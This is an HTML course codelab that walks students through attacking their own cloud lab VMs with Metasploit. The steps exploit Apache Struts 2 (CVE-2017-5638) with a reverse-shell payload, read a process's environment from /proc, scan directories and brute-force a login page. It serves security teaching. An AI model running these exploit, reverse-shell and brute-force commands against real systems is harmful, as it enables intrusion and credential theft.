
<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
<meta name="theme-color" content="#4F7DC9">
<meta charset="UTF-8">
<title>6.5: Exploitation tools (Pt 2)</title>
<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
<style>
.success{color:#1e8e3e}.error{color:red} </style>
</head>
<body>
<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
<google-codelab codelab-gaid="" id="W6.5_exploit2" title="6.5: Exploitation tools (Pt 2)" environment="web" feedback-link="https://docs.google.com/document/d/1sDUBNQC5gSosULqLvv-IZrkmwfA7UUmO4Otmmi3lBwA">
<google-codelab-step label="Apache Struts 2 setup" duration="5">
<p>On Google Cloud Platform&#39;s Compute Engine, create a new instance in <code>us-west1-b</code>.</p>
<ul>
<li>Use <code>Ubuntu</code> for x86/64 as the VM</li>
<li>Enable HTTP</li>
<li>Keep track of both the external and internal IP address of the instance <code>(struts2_external_IP / struts2_internal_IP)</code></li>
<li>The command below can be used to do so</li>
</ul>
<pre><code>gcloud compute instances create struts \
  --machine-type e2-micro --zone us-west1-b \
  --image-project ubuntu-os-cloud --image-family ubuntu-2004-lts \
  --tags=http-server</code></pre>
<p>Log into the VM and install Docker</p>
<pre>sudo apt update -y
sudo apt install docker.io -y</pre>
<p>Run the vulnerable Struts docker container (originally from <code>piesecurity</code>). The vulnerable container puts the website on port 8080. The docker command&#39;s <code>-p</code> flag remaps it to port 80 on the host VM. </p>
<pre>sudo docker run -p 80:8080 -it wuchangfeng/apache-struts2-cve-2017-5638:latest</pre>
<p>Test the instance by visiting <code>http://</code>&lt;<code>struts2_external_IP</code>&gt;<code>/showcase</code></p>
<p class="image-container"><img style="width:524px" src="img/23f8d786d0b17342.png"></p>
</google-codelab-step>
<google-codelab-step label="Metasploit Apache Struts 2" duration="10">
<p><code>ssh</code> into your Kali VM on Compute Engine</p>
<pre>ssh root@&lt;kali_external_IP&gt;
(Use password that you set previously)</pre>
<ul>
<li>Launch Metasploit via the shell </li>
</ul>
<pre>msfconsole</pre>
<ul>
<li>Use Metasploit to find Struts2 vulnerabilities</li>
</ul>
<pre>msf &gt; search struts2</pre>
<ul>
<li>Find the one that compromised Equifax (March 7, 2017), then activate it with the <code>use</code> command</li>
</ul>
<pre>msf &gt; use exploit/multi/http/struts2_...</pre>
<ul>
<li>Set the target IP address and port of vulnerable Struts2 instance. Use the <code>struts2_internal_IP</code> address of the instance.</li>
</ul>
<pre>msf exploit(...) &gt; set RHOST &lt;struts2_internal_IP&gt;
msf exploit(...) &gt; set RPORT 80</pre>
<ul>
<li>Set the target URI for the exploit</li>
</ul>
<pre>msf exploit(...) &gt; set TARGETURI /showcase</pre>
<ul>
<li>Set and configure the payload you want to execute after exploitation. In this case, we will invoke a shell and connect it back up to port 80 of our Kali VM.</li>
</ul>
<pre>msf exploit(...) &gt; set PAYLOAD linux/x64/shell/reverse_tcp
msf exploit(...) &gt; set LHOST &lt;kali_internal_IP&gt;
msf exploit(...) &gt; set LPORT 80</pre>
<ul>
<li>Type the following to get a summary of your configuration for the exploit</li>
</ul>
<pre>msf exploit(...) &gt; show options</pre>
<ul>
<li>Then, launch the exploit </li>
</ul>
<pre>msf exploit(...) &gt; exploit</pre>
<ul>
<li>Although the UI might not indicate it, a successful exploit will give you a shell on the vulnerable server.<img style="width:624px" src="img/f2bb72d777759be8.png"></li>
<li><strong>Use this shell and show screenshots of the execution of the following commands to obtain the current working directory of the server, a directory listing of it, the </strong><strong><code>uid</code></strong><strong> of it, and a full process listing of the server.</strong></li>
</ul>
<pre>pwd
ls
id
ps auxww</pre>
<ul>
<li><strong>For the process that launched the server, show a screenshot of its environment variables as revealed via </strong><strong><code>/proc</code></strong></li>
</ul>
<pre>cat /proc/&lt;PID&gt;/environ</pre>
<ul>
<li>Exit out of the shell to return to the Metasploit console</li>
</ul>
<pre>exit</pre>
<ul>
<li>Within the Metasploit console, you will still be in the exploit sub-menu, you can return to the main console.</li>
</ul>
<pre>msf exploit(...) &gt; back
msf &gt;</pre>
</google-codelab-step>
<google-codelab-step label="metasploit Directory Scan" duration="5">
<p>If your WFP1 VM is not running, visit Compute Engine to start it. From the Metasploit console, load the <code>dir_scanner</code> module. Note that the console supports tab completion for your command typing convenience.</p>
<pre>msf &gt; use auxiliary/scanner/http/dir_scanner</pre>
<p>Show which file is being used for the directory names to use</p>
<pre>msf &gt; show options</pre>
<p>Set the target to your WFP1 instance</p>
<pre>msf auxiliary(dir_scanner) &gt; set RHOSTS &lt;wfp1_internal_IP&gt;</pre>
<p>Run the attack</p>
<pre>msf auxiliary(dir_scanner) &gt; exploit</pre>
<ul>
<li><strong>Show a screenshot of the results for your lab notebook, then return to the main console</strong></li>
</ul>
<pre>msf exploit(...) &gt; back
msf &gt;</pre>
</google-codelab-step>
<google-codelab-step label="metasploit Credential Stuffing" duration="5">
<p>If your WFP2 VM is not running, visit Compute Engine to start it. Within the Metasploit console, load the <code>http_login</code> brute-force module</p>
<pre>msf &gt; use auxiliary/scanner/http/http_login</pre>
<p>Set the target to the internal IP address of your WFP2 instance</p>
<pre>msf auxiliary(http_login) &gt; set RHOSTS &lt;wfp2_internal_IP&gt;</pre>
<p>Set the URI to Authentication Example #1</p>
<pre>msf auxiliary(http_login) &gt; set AUTH_URI /authentication/example1/</pre>
<p>Then, run the attack</p>
<pre>msf auxiliary(http_login) &gt; exploit</pre>
<ul>
<li><strong>Scroll up to find successful login and take a screenshot of the output. Note, to only show the result, do the following and then re-run</strong></li>
</ul>
<pre>msf auxiliary(http_login) &gt; set VERBOSE false</pre>
<p>Exit out of the sub-menu and the Metasploit console</p>
</google-codelab-step>
<google-codelab-step label="Clean-up" duration="2">
<p>Visit the Compute Engine console.</p>
<ul>
<li>Stop the Kali and WFP VMs</li>
</ul>
<pre><code>gcloud compute instances stop &lt;List_of_VMs&gt; --zone=us-west1-b</code></pre>
<ul>
<li>Delete the Apache Struts VM.</li>
</ul>
<pre><code>gcloud compute instances delete struts --zone=us-west1-b</code></pre>
</google-codelab-step>
</google-codelab>
<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
<script src="//support.google.com/inapp/api.js"></script>
</body>
</html>
